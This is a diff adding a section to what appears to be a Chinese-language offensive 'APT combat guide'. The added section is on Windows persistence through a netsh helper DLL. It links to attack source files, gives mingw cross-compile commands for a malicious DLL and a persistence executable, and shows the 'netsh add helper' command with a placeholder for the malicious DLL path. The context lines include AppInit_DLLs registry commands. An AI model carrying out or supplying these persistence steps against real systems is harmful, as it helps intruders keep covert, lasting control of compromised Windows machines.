@@ -921,3 +921,22 @@ x86_64-w64-mingw32-g++ -O2 AppInit.cpp -o AppInit.exe -I /usr/share/mingw-w64/in
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /d 0
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /f
 ```
+
+### netsh helper DLL
+
+[netsh_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/netsh_dll.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o netsh.dll netsh_dll.cpp -fpermissive
+```
+
+```Bash
+netsh
+add helper 恶意DLL路径
+```
+
+[netsh_pers.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/netsh_pers.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 netsh_pers.cpp -o netsh_pers.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
